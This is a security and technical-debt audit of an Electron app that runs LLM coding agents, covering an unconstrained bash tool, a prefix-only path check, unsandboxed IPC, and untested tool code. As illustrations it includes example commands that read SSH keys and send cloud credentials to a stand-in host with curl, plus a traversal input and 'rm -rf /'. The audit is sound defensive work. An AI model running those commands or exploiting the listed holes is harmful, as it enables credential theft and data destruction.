# Codebase Concerns

**Analysis Date:** 2026-04-25

## Tech Debt

**Provider system was recently gutted:**
- Issue: Multiple provider files were deleted (`claude-code.ts`, `claude.ts`, `cli-base.ts`, `codex.ts`, `credentials.ts`, `openai.ts`) but the project still claims multi-provider support. Only `lm-studio` and `ollama` remain in `electron/main/services/providers/factory.ts`.
- Files: `electron/main/services/providers/factory.ts`, `src/shared/provider-catalog.ts`
- Impact: UI may reference providers (`openai`, `claude-code`) that no longer have runtime backends; default Thread model is `gpt-5.1-codex-mini` per `prisma/schema.prisma:27` but no OpenAI provider is registered, so any thread created with the default falls through `getProvider()` and throws `Provider desconhecido: openai`.
- Fix approach: Either re-register the providers or update `Thread.provider`/`Thread.model` defaults in `prisma/schema.prisma` and `electron/main/ipc/threads.ts:183-185` to a real provider (`lm-studio`).

**Credential storage removed but no replacement:**
- Issue: `electron/main/services/providers/credentials.ts` (deleted) handled secret persistence. The remaining providers (`lm-studio`, `ollama`) bypass it via `getAuthHeaders(): {}` in `electron/main/services/providers/lm-studio.ts:43-45`, but `OpenAICompatibleProvider.setApiKey()` is now a no-op stub (`openai-compatible.ts:82`).
- Files: `electron/main/services/providers/openai-compatible.ts`, `electron/main/services/providers/lm-studio.ts`
- Impact: If a remote OpenAI-compatible endpoint is added that requires auth, there is no secure secret store. Users would need to either hardcode keys or invent ad-hoc storage.
- Fix approach: Reintroduce a secret store using Electron's `safeStorage` API (or `keytar`) in a new `credentials.ts` and wire it through `OpenAICompatibleProvider`.

**Hand-rolled SQL migrations instead of Prisma Migrate:**
- Issue: `electron/main/services/prisma.ts:18-128` uses `$executeRawUnsafe` with `CREATE TABLE IF NOT EXISTS` and a swallowed `ALTER TABLE` for `approval_mode`. The Prisma schema (`prisma/schema.prisma`) is not the source of truth — it is mirrored manually.
- Files: `electron/main/services/prisma.ts`, `prisma/schema.prisma`
- Impact: Schema drift between Prisma client expectations and actual SQLite tables is silent. `tool_logs` is dropped and recreated on every app start (line 68: `DROP TABLE IF EXISTS tool_logs`), erasing every previous run's logs at boot.
- Fix approach: Adopt `prisma migrate deploy` at app startup, or at minimum stop dropping `tool_logs` and use proper `IF NOT EXISTS` semantics.

**Argument-alias normalization layer:**
- Issue: `electron/main/services/tools/tool-execution.ts:69-137` maintains a hand-curated alias table (`file_path → path`, `cmd → command`, etc.) to compensate for local models inventing parameter names. This grows unboundedly and silently masks model-side prompt issues.
- Files: `electron/main/services/tools/tool-execution.ts`
- Impact: Maintenance burden; new models will require new aliases. Hides the underlying tool-schema discoverability problem.
- Fix approach: Add tool-call retry with structured error feedback (already partially done via Zod error) and remove the alias table, letting the model self-correct.

**Harmony format string-mangling pipeline:**
- Issue: `electron/main/services/providers/openai-compatible.ts:160-188` uses regex chains to strip `<|channel|>`, `<|message|>`, `commentary`, `bash}`, `functions.write_file?` from streaming text. This is fragile pattern-matching against a moving target.
- Files: `electron/main/services/providers/openai-compatible.ts`
- Impact: Models that emit slightly different control tokens leak garbage into the UI; legitimate user content containing `<|...|>` would be eaten.
- Fix approach: Use models that don't emit Harmony format (configure properly), or implement a proper Harmony parser that consumes the `<|start|>...<|end|>` envelope as a tokenizer rather than via global regex.

**Missing IPC handler `registerCredentialsHandlers`:**
- Issue: `electron/main/ipc/index.ts` no longer registers any credential-related IPC, but the renderer's `src/components/settings/settings-screen.tsx` likely still expects API key entry UI.
- Files: `electron/main/ipc/index.ts`, `src/components/settings/settings-screen.tsx`
- Impact: Settings UI may expose dead controls or throw on `invoke("credentials:set")`.

## Known Bugs

**`tool_logs` wiped on every launch:**
- Symptoms: Per-thread tool execution history disappears between app restarts.
- Files: `electron/main/services/prisma.ts:68`
- Trigger: App startup runs `DROP TABLE IF EXISTS tool_logs`.
- Workaround: None.

**`harmonyMode` final fallback emits a Portuguese-only message:**
- Symptoms: When sanitization yields empty content, the user sees "[modelo retornou resposta vazia ou malformada — tente de novo]" regardless of UI language.
- Files: `electron/main/services/providers/openai-compatible.ts:333,374`
- Trigger: gpt-oss-20b on LM Studio with empty content + no tool calls.

**`resolveSafe` path traversal check is prefix-only:**
- Symptoms: `resolveSafe("/home/user/proj", "../proj-evil/foo")` would resolve to `/home/user/proj-evil/foo`. `resolved.startsWith("/home/user/proj")` returns `true` because `proj-evil` starts with `proj`.
- Files: `electron/main/services/tools/tool.ts:139-146`
- Trigger: User opens project at `/some/dir/foo`; LLM passes `../foo-bar/secret`. The check passes despite escaping the project root.
- Workaround: Append a path separator before comparing — `if (!resolved.startsWith(projectPath + sep) && resolved !== projectPath)`.
- Severity: HIGH. This is the only line of defense for the full read/write/delete tool surface.

**`bash` tool ignores `resolveSafe` for the command itself:**
- Symptoms: Although `cwd` is sandboxed via `resolveSafe`, the shell command `input.command` is passed unmodified to `/bin/sh -c`. The model can run `cat ~/.ssh/id_rsa`, `curl example.com -d @~/.aws/credentials`, etc.
- Files: `electron/main/services/tools/definitions/bash.ts:65-69`
- Trigger: Any LLM tool call when `approvalMode === "full-auto"`, where `checkPermissions` auto-allows (`bash.ts:43`).
- Workaround: In `full-auto`, always require approval for `bash`, OR maintain an allow-list (git, pnpm, npm, ls, etc.).

**`files:read` IPC has no path-sandbox:**
- Symptoms: Renderer can `invoke("files:read", { path: "/etc/shadow" })` and get back the contents (subject to OS permissions).
- Files: `electron/main/ipc/files.ts:79-87`
- Trigger: A compromised renderer or any renderer-side bug.
- Workaround: Validate `args.path` against the active project root before reading.

**`files:list` IPC accepts arbitrary `args.path`:**
- Symptoms: Same class as above — no validation that `args.path` is a known project path.
- Files: `electron/main/ipc/files.ts:75-77`
- Workaround: Cross-check `args.path` against `prisma.project.findMany` paths.

**`shell:open-path`, `shell:open-url`, `shell:open-terminal` accept untrusted strings:**
- Symptoms: Renderer can ask main to `shell.openExternal(any-url)`, `shell.openPath(any-path)`, or spawn a terminal at any path.
- Files: `electron/main/ipc/shell.ts:158-203`
- Trigger: Compromised renderer or XSS in markdown rendering. `shell.openExternal` can launch `file://`, `javascript:`, custom-scheme handlers.
- Workaround: Validate URL scheme is `https?://`; validate path is inside a known project.

**`terminal:write` lets any window write to any session:**
- Symptoms: `electron/main/ipc/shell.ts:271-279` looks up session by id but does not check `event.sender.id === session.webContentsId`. Multiple BrowserWindows could cross-talk.
- Files: `electron/main/ipc/shell.ts:271`
- Workaround: Add ownership check.

**Diff-stat regex parses `+/-` from arbitrary tool summary text:**
- Symptoms: `parseDiffStat()` in `electron/main/ipc/messages.ts:31-44` matches `/\+(\d+)\s+-\s*(\d+)/` against any activity summary — a tool-result string like "Created 5 files - removed 3 placeholders" would be parsed as a diff stat.
- Files: `electron/main/ipc/messages.ts:31`
- Impact: UI shows wrong line-add/delete counters.

**Edit-file staleness check has 1-second slop:**
- Symptoms: `currentStat.mtimeMs > fileState.timestamp + 1000` treats any mtime within 1s of last-read as fresh. On fast filesystems this is fine, but two writes within the same second from external processes will be silently overwritten.
- Files: `electron/main/services/tools/definitions/edit-file.ts:179`, `electron/main/services/tools/definitions/write-file.ts:59`
- Workaround: Use a content-hash fingerprint instead of mtime.

**`servedReads` dedup map is process-global, never expires:**
- Symptoms: `clearReadDedup()` is called per run (`electron/main/services/tools/tool-executor-openai.ts:93`), but if the run errors before that call, entries persist. Memory leak across long-running app sessions.
- Files: `electron/main/services/tools/definitions/read-file.ts:8`
- Workaround: Move the map into `ToolUseContext` or clear it in a `finally`.

**Default thread model `gpt-5.1-codex-mini` does not exist in any registered provider:**
- Symptoms: `prisma/schema.prisma:27` defaults `model` to `gpt-5.1-codex-mini`, but only `lm-studio` and `ollama` providers are registered. A new thread created with the default fails immediately.
- Files: `prisma/schema.prisma:27`, `electron/main/services/prisma.ts:37`, `electron/main/ipc/threads.ts:184`

## Security Considerations

**Renderer is `sandbox: false` with `contextBridge` exposing arbitrary IPC:**
- Risk: `electron/main/index.ts:20` sets `sandbox: false`, and `electron/preload/index.ts:11-23` exposes a generic `invoke(channel, ...args)` that bypasses any per-channel typing. A renderer XSS becomes full main-process RCE because every `ipcMain.handle` is reachable.
- Files: `electron/main/index.ts:18-21`, `electron/preload/index.ts`
- Current mitigation: None. Renderer has no `contextIsolation: true` declaration (default is true in Electron >=12, but `sandbox:false` weakens it).
- Recommendations: Enable `sandbox: true`, expose typed APIs per IPC channel instead of a generic `invoke`. Validate origin in each handler.

**Path traversal via prefix check (see Bugs):**
- Risk: `resolveSafe` allows escaping into sibling directories sharing a prefix.
- Files: `electron/main/services/tools/tool.ts:142`
- Recommendations: Use `path.relative(projectPath, resolved)` and ensure the result does not start with `..`, OR append `path.sep` to `projectPath` before `startsWith`.

**`bash` tool is unconstrained:**
- Risk: `electron/main/services/tools/definitions/bash.ts` runs arbitrary shell. In `full-auto` mode no approval is required.
- Current mitigation: Approval prompt in `suggest`/`auto-edit` modes.
- Recommendations: Maintain a deny-list (`rm -rf /`, network access to internal IPs) and/or a strict allow-list scoped to the project directory. Prefer `child_process.spawn`/`execFile` with `shell:false` and split arguments where possible to avoid shell-meta-character interpretation.

**Renderer can drive `shell.openExternal`:**
- Risk: `ipcMain.handle("shell:open-url", ...)` blindly opens any URL. `javascript:` and `file://` URLs and custom scheme handlers can lead to local file disclosure or RCE.
- Files: `electron/main/ipc/shell.ts:162-164`
- Recommendations: Allow only `http://` and `https://`.

**`provider-config.json` written without atomicity:**
- Risk: `writeFileSync` directly to the destination path. A crash mid-write corrupts user config.
- Files: `electron/main/services/providers/provider-config.ts:32-34`
- Recommendations: Write to `${path}.tmp` then `rename`.

**Process env exposed to bash subprocesses:**
- Risk: `electron/main/services/tools/definitions/bash.ts:67` passes `{ ...process.env }` to spawned commands. Electron main process inherits the full user environment including cloud tokens, GitHub tokens, etc. The LLM can read them with the bash tool by running `env`.
- Recommendations: Filter env to a known-safe allow-list (`PATH`, `HOME`, `LANG`, etc.).

**`auto-title` IPC effect leaks user content to the model:**
- Risk: `electron/main/services/threads/auto-title.ts` is invoked on first message and sends `_content` to a provider. If the user mistyped a secret, it's sent twice (once for completion, once for title generation).
- Recommendations: Document this; truncate aggressively.

## Performance Bottlenecks

**`provider:catalog` IPC blocks until every provider responds:**
- Problem: `electron/main/ipc/providers.ts:18-28` does `Promise.all` over every provider's `refreshCatalogModels()`. If `lm-studio` is offline the fetch will hang for tens of seconds (no timeout on `fetch` calls).
- Files: `electron/main/ipc/providers.ts:18-28`, `electron/main/services/providers/lm-studio.ts:71`
- Cause: `fetch` has no `AbortSignal` with timeout.
- Improvement path: Add `AbortController` with 2-3s timeout on every provider HTTP call.

**`generateFileTree` reads the project on every run:**
- Problem: Tool executor calls `generateFileTree(projectPath)` at the start of each LLM run (`electron/main/services/tools/tool-executor-openai.ts:96-99`). On large repos this enumerates thousands of files synchronously each turn.
- Files: `electron/main/services/tools/tool-context.ts`, `electron/main/services/tools/tool-executor-openai.ts:96`
- Improvement path: Cache by mtime of project root + invalidate via `fs.watch`.

**Recursive `files:list` walks 5 levels deep, sequential:**
- Problem: `electron/main/ipc/files.ts:27-70` is fully sequential and traverses the project up to depth 5. For a typical Node project with thousands of dirs this is slow.
- Files: `electron/main/ipc/files.ts:27`
- Improvement path: Parallelize with bounded concurrency, or stream results to renderer as they arrive.

**`runGitNumstat` invoked per-thread in `thread:list`:**
- Problem: `electron/main/ipc/threads.ts:107-160` runs `git diff --numstat` for every thread that doesn't have cached metadata. For a project with 50 threads → 50 git invocations.
- Improvement path: Cache by `(workdir, HEAD sha)` for the duration of the IPC call.

**Streaming tokens are not throttled:**
- Problem: `electron/main/ipc/messages.ts:238-241` sends every delta (often single-token) over IPC + IPC log. Renderer renders Markdown on each chunk.
- Improvement path: Coalesce deltas at ~16ms intervals before posting.

**Prisma client created without connection pool tuning:**
- Problem: `electron/main/services/prisma.ts:10-12` uses default settings — fine for SQLite, but `prisma.$executeRawUnsafe` called sequentially during `ensureDatabase` blocks app startup.
- Improvement path: Skip `ensureDatabase` if a `_meta` row says schema-version matches expected.

## Fragile Areas

**`OpenAICompatibleProvider.sendMessageStream` (425 lines):**
- Files: `electron/main/services/providers/openai-compatible.ts`
- Why fragile: One mega-method handles SSE parsing, harmony stripping, reasoning extraction, tool-call accumulation, and fallback empty-response handling. Touching one branch risks breaking another.
- Safe modification: Extract each concern (SSE reader, harmony sanitizer, tool-call accumulator) into separate units with focused tests. Currently no tests exist.
- Test coverage: Zero — no test framework configured.

**`messages.ts` `streamResponse` (265 lines, fire-and-forget):**
- Files: `electron/main/ipc/messages.ts:117-130`
- Why fragile: User message is created in DB BEFORE awaiting the stream. If `streamResponse` throws synchronously the user message persists with no assistant follow-up. Errors are caught only as `.catch()` on the unawaited promise.
- Safe modification: Move user-message persistence into the same try/catch that owns the stream.

**Tool registry import-cycle near-miss:**
- Files: `electron/main/services/tools/tool-execution.ts:172-174`
- Why fragile: Lazy `await import("./definitions/index.js")` for error-message generation suggests a real circular dependency that was patched. Direct refactors of `index.ts` could resurface it.

**`stripHarmonyFinal` regex chain:**
- Files: `electron/main/services/providers/openai-compatible.ts:179-188`
- Why fragile: Strips `\bbash\}`, `\bfunctions\.[a-z_]+\??`, etc. Any model that legitimately uses these tokens (e.g., user asking how to write a bash function) will have content corrupted.

**`tool-executor-openai.ts` per-thread approval cache:**
- Files: `electron/main/services/tools/tool-executor-openai.ts:62-76`
- Why fragile: `threadApprovals` map is process-global. If a user revokes an approval there's no UI mechanism to clear it; deleted threads only clear via explicit `clearThreadApprovals` (not wired to the IPC delete handler at `electron/main/ipc/threads.ts:220`).

## Scaling Limits

**`MAX_FILE_SIZE = 1 MB` for read/edit/write:**
- Current capacity: 1,048,576 bytes per file
- Limit: Hard-fail above 1 MB even with offset/limit (read-side checks pre-stat at `read-file.ts:64`)
- Scaling path: Allow streaming reads over 1 MB when offset+limit are provided; gate edit/write at higher caps with explicit user opt-in.

**`MAX_TOOL_ITERATIONS` per run:**
- Files: `electron/main/services/tools/tool-context.ts`
- Limit: Whatever value is in `MAX_TOOL_ITERATIONS` — model is hard-stopped after N tool calls per turn.
- Scaling path: Make configurable per-thread.

**SQLite single-writer:**
- Limit: All IPC handlers serialize through one Prisma client; under heavy concurrent tool logging plus chat persistence, contention will appear.
- Scaling path: Enable WAL mode in `ensureDatabase` (`PRAGMA journal_mode=WAL`).

## Dependencies at Risk

**`node-pty` requires native rebuild per Electron version:**
- Risk: `package.json` `postinstall` runs `electron-rebuild -w node-pty`. Failed rebuilds break the terminal silently.
- Impact: Terminal panel won't open; the spawn loop in `electron/main/ipc/shell.ts:215-229` falls through every candidate.
- Migration plan: Document required toolchain (Python, MSVC, etc.) in README.

**`minimatch` v10 ESM-only:**
- Risk: Breaking change between minimatch v3 and v10; if any code path imports the CommonJS form it breaks.
- Files: `electron/main/services/tools/definitions/glob.ts:4`
- Mitigation: Confirmed used as ESM here, but the build chain (`electron-vite`) must keep ESM output.

**`@prisma/client` v6 + Electron packaging:**
- Risk: Prisma's query engine binary must be bundled correctly for production builds. `electron-vite` may not copy the engine into the app bundle.
- Migration plan: Verify `node_modules/.prisma/client/*.node` ships with the packaged app.

**Two lockfiles present:**
- Risk: Both `pnpm-lock.yaml` and `package-lock.json` exist in the repo root. Different installs can yield different dependency trees.
- Files: `pnpm-lock.yaml`, `package-lock.json`
- Mitigation: Remove `package-lock.json` (project's `postinstall` references pnpm-only `onlyBuiltDependencies`).

## Missing Critical Features

**No automated tests:**
- Problem: Zero test files in repo (`*.test.ts`, `*.spec.ts` not present). No test runner in `devDependencies`.
- Blocks: Refactoring the providers, tool layer, or harmony pipeline safely.

**No CI configuration:**
- Problem: No `.github/workflows`, no `Makefile` test target, no pre-commit hooks beyond ESLint.
- Blocks: Catching regressions before merge.

**No structured logging:**
- Problem: All diagnostics use `console.log` (e.g., `electron/main/ipc/messages.ts:105`, `electron/main/services/providers/openai-compatible.ts:128`). No log levels, no rotation, no per-thread isolation in production builds.
- Blocks: Field debugging when a user reports a bug.

**No error reporting / crash telemetry:**
- Problem: Unhandled rejections in `streamResponse` only emit to renderer. Crashes in main process disappear.
- Blocks: Knowing about real-world failures.

**No backup/export of `duck-codex.db`:**
- Problem: All threads, messages, projects live in `userData/duck-codex.db`. No export tool.
- Blocks: User migration, recovery from corruption.

## Test Coverage Gaps

**The entire tool layer is untested:**
- What's not tested: `read_file`, `edit_file`, `write_file`, `bash`, path-traversal logic in `resolveSafe`, harmony sanitization, tool-call accumulator.
- Files: `electron/main/services/tools/definitions/*.ts`, `electron/main/services/tools/tool.ts`, `electron/main/services/providers/openai-compatible.ts`
- Risk: A regression in `findActualString` (`edit-file.ts:45`) silently corrupts user files. A regression in `resolveSafe` (`tool.ts:139`) is a security incident.
- Priority: HIGH — these tools modify the user's filesystem directly.

**IPC handlers untested:**
- What's not tested: `files:read`, `files:list`, `shell:open-*`, `terminal:*`, `provider:*`.
- Files: `electron/main/ipc/*.ts`
- Risk: Path-traversal and command-injection regressions in IPC layer.
- Priority: HIGH.

**Provider stream parsing untested:**
- What's not tested: SSE parsing, partial JSON tool-call accumulation across chunks, harmony stripping.
- Files: `electron/main/services/providers/openai-compatible.ts:97-386`
- Risk: Subtle streaming bugs (token leak, wrong tool-call boundaries) cause silent failures users will blame on the model.
- Priority: MEDIUM.

**Database migration path untested:**
- What's not tested: Upgrading an existing `duck-codex.db` from prior schema (e.g., before `approval_mode` column).
- Files: `electron/main/services/prisma.ts`
- Risk: Data loss or app-won't-start on update.
- Priority: HIGH — production-robust requirement implies users have existing DBs.

---

*Concerns audit: 2026-04-25*
